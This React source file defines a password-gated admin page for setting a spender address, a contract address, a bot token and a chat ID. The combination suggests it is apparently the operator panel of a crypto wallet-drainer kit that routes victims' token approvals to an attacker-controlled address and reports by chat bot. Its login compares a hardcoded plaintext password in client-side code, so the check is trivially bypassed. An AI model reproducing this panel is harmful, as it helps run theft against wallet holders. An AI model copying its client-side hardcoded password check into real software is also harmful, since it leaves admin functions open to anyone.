import { useEffect, useState } from "react";
import axios from "axios";
import { FaEye, FaEyeSlash } from "react-icons/fa";
import styles from "@/styles/Admin.module.css";

export default function Admin() {
  const [password, setPassword] = useState("");
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [error, setError] = useState("");
  const [successMessage, setSuccessMessage] = useState("");
  const [formData, setFormData] = useState({
    spenderAddress: "",
    contractAddress: "",
    botToken: "",
    chatId: "",
  });
  const [showPassword, setShowPassword] = useState(false);
  const [loading, setLoading] = useState(false); // Loading state for fetching data
  const [updating, setUpdating] = useState(false); // Loading state for updating variables

  const handlePasswordSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (password === "89145267") {
      setIsAuthenticated(true);
      setError("");
    } else {
      setError("Incorrect password. Please try again.");
    }
  };

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setFormData({
      ...formData,
      [e.target.name]: e.target.value,
    });
  };

  const handleFormSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setUpdating(true); // Start updating
    try {
      const response = await axios.post("/api/update-env", formData);
      if (response.status === 200) {
        setSuccessMessage("Environment variables updated successfully!");
        setError("");
      }
    } catch (err) {
      setError("Failed to update the environment variables.");
    } finally {
      setUpdating(false); // End updating
    }
  };

  useEffect(() => {
    if (isAuthenticated) {
      setLoading(true);
      const fetchEnvVariables = async () => {
        try {
          const response = await axios.get("/api/get-env");
          setFormData({
            spenderAddress: response.data.spenderAddress || "",
            contractAddress: response.data.contractAddress || "",
            botToken: response.data.botToken || "",
            chatId: response.data.chatId || "",
          });
        } catch (err) {
          console.error("Failed to fetch environment variables.", err);
        } finally {
          setLoading(false);
        }
      };
      fetchEnvVariables();
    }
  }, [isAuthenticated]);

  const handleLogout = () => {
    setIsAuthenticated(false);
    setPassword("");
    setFormData({
      spenderAddress: "",
      contractAddress: "",
      botToken: "",
      chatId: "",
    });
  };

  const dismissError = () => {
    setError("");
  };

  const dismissSuccess = () => {
    setSuccessMessage("");
  };

  return (
    <div className={styles.adminContainer}>
      {!isAuthenticated ? (
        <div className={styles.card}>
          <h2 className={styles.title}>Admin Login</h2>
          <form onSubmit={handlePasswordSubmit} className={styles.form}>
            <div className={styles.inputGroup}>
              <label htmlFor="password">Enter Password</label>
              <div style={{ position: "relative" }}>
                <input
                  type={showPassword ? "text" : "password"}
                  id="password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  placeholder="Enter admin password"
                  required
                />
                <span
                  className={styles.eyeIcon}
                  onClick={() => setShowPassword(!showPassword)}
                >
                  {showPassword ? <FaEyeSlash /> : <FaEye />}
                </span>
              </div>
            </div>

            {error && (
              <div className={styles.errorMessage}>
                {error}
                <button onClick={dismissError} className={styles.dismissButton}>
                  Dismiss
                </button>
              </div>
            )}
            <button type="submit" className={styles.button}>
              Login
            </button>
          </form>
        </div>
      ) : (
        <div className={styles.card}>
          <h2 className={styles.title}>Admin Dashboard</h2>
          {loading ? (
            <div className={styles.loader}>Loading existing settings...</div>
          ) : (
            <form onSubmit={handleFormSubmit} className={styles.form}>
              <div className={styles.inputGroup}>
                <label htmlFor="spenderAddress">Spender Address</label>
                <input
                  type="text"
                  id="spenderAddress"
                  name="spenderAddress"
                  value={formData.spenderAddress}
                  onChange={handleInputChange}
                  required
                />
              </div>
              <div className={styles.inputGroup}>
                <label htmlFor="contractAddress">Contract Address</label>
                <input
                  type="text"
                  id="contractAddress"
                  name="contractAddress"
                  value={formData.contractAddress}
                  onChange={handleInputChange}
                  required
                />
              </div>
              <div className={styles.inputGroup}>
                <label htmlFor="botToken">Bot Token</label>
                <input
                  type="text"
                  id="botToken"
                  name="botToken"
                  value={formData.botToken}
                  onChange={handleInputChange}
                  required
                  readOnly
                />
              </div>
              <div className={styles.inputGroup}>
                <label htmlFor="chatId">Chat ID</label>
                <input
                  type="text"
                  id="chatId"
                  name="chatId"
                  value={formData.chatId}
                  onChange={handleInputChange}
                  required
                  readOnly
                />
              </div>
              {error && (
                <div className={styles.errorMessage}>
                  {error}
                  <button
                    onClick={dismissError}
                    className={styles.dismissButton}
                  >
                    Dismiss
                  </button>
                </div>
              )}
              {successMessage && (
                <div className={styles.successMessage}>
                  {successMessage}
                  <button
                    onClick={dismissSuccess}
                    className={styles.dismissButton}
                  >
                    Dismiss
                  </button>
                </div>
              )}
              {updating ? (
                <div className={styles.loader}>Updating variables...</div>
              ) : (
                <button type="submit" className={styles.button}>
                  Update Variables
                </button>
              )}
              <button onClick={handleLogout} className={styles.logoutButton}>
                Logout
              </button>
            </form>
          )}
        </div>
      )}
    </div>
  );
}
